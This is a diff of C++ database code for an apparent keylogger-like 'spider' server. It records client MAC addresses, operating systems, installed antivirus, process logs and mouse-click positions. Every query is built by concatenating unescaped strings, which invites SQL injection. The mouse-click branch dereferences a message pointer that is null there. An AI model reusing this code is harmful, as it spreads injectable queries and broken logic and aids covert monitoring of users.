@@ -9,7 +9,7 @@
 */
 
 #include	<iostream>
-#include <sstream>
+#include	<sstream>
 #include	"Database/Sqlite.hpp"
 
 static int	callback(void *data, int argc, char **argv, char **azColName)
@@ -56,7 +56,6 @@ void spider::Sqlite::createDb()
 	       ");" \
 	       "CREATE TABLE IF NOT EXISTS `log` (" \
 	       "  `id` INTEGER PRIMARY KEY AUTOINCREMENT," \
-	       "  `mac` varchar(255)," \
 	       "  `time` timestamp DEFAULT NULL," \
 	       "  `process` varchar(255) DEFAULT NULL," \
 	       "  `message` longtext DEFAULT NULL" \
@@ -78,13 +77,61 @@ void	spider::Sqlite::execute(const char *querry)
   }
 }
 
-void spider::Sqlite::addEntryLog(const char *mac, const char *time, const char *proccess,
+void spider::Sqlite::addEntryRegister(const char *mac, const char *os,
+				      const char *antivirus)
+{
+  std::ostringstream strstream;
+  std::string		querry;
+
+  strstream << "INSERT INTO register (mac, os, antivirus) VALUES ('" << mac << "', '" << os << "', '" << antivirus << "');";
+  querry = strstream.str();
+  execute(querry.c_str());
+}
+
+void spider::Sqlite::removeEntryRegister(int id)
+{
+  std::ostringstream strstream;
+  std::string		querry;
+
+  strstream <<  "DELETE FROM register WHERE id='" << id << "'";
+  querry = strstream.str();
+
+  execute(querry.c_str());
+}
+
+void spider::Sqlite::pushData(t_unserialized data)
+{
+  if (data.register_)
+    addEntryRegister(data.register_->mac.c_str(),
+		     data.register_->os.c_str(),
+		     data.register_->antivirus.c_str());
+  else if (data.message)
+    addEntryLog(data.message->timestamp.c_str(),
+		data.message->process.c_str(),
+		data.message->data.c_str());
+  else
+  {
+    std::ostringstream strstream;
+    std::string		querry;
+
+    strstream << "Click on " << data.mouse->keytype <<
+	      ", at position x: " << data.mouse->x <<
+	      ", and y: " << data.mouse->y << ".";
+    querry = strstream.str();
+    addEntryLog(data.message->timestamp.c_str(),
+		data.message->process.c_str(),
+		querry.c_str());
+  }
+
+}
+
+void spider::Sqlite::addEntryLog(const char *time, const char *proccess,
 			      const char *message)
 {
   std::ostringstream strstream;
   std::string		querry;
 
-  strstream << "INSERT INTO log (mac, time, process, message) VALUES ('" << mac << "', '" << time << "', '" << proccess << "', '" << message << "');";
+  strstream << "INSERT INTO log (time, process, message) VALUES ('" << time << "', '" << proccess << "', '" << message << "');";
   querry = strstream.str();
   execute(querry.c_str());
 }
